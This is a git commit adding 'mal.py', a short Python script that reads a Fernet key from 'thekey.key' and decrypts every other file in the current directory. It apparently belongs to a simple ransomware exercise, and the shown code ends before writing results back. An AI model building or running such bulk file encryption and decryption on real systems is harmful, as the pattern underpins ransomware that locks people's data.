ee3cba3a8514dc41968580af31d2934e354ef01b
Nabegh <97016646+Nmuhra@users.noreply.github.com>
2022-05-17 16:42:17 +0200

    Create mal.py

---
+++ mal.py
@@ -0,0 +1,22 @@
+import os
+import cryptography
+from cryptography.fernet import Fernet
+
+files = []
+
+for file in os.listdir():
+  if file == "mal.py" or file == "thekey.key":
+    continue
+  if os.path.isfile(file):
+    files.append(file)
+
+print(files)
+
+with open("thekey.key", "rb") as key:
+  secretkey = key.read()
+
+for file in files:
+  with open(file, "rb") as thefile:
+    contents = thefile.read()
+  contents_decrypted = Fernet(secretkey).decrypt(contents)
+  
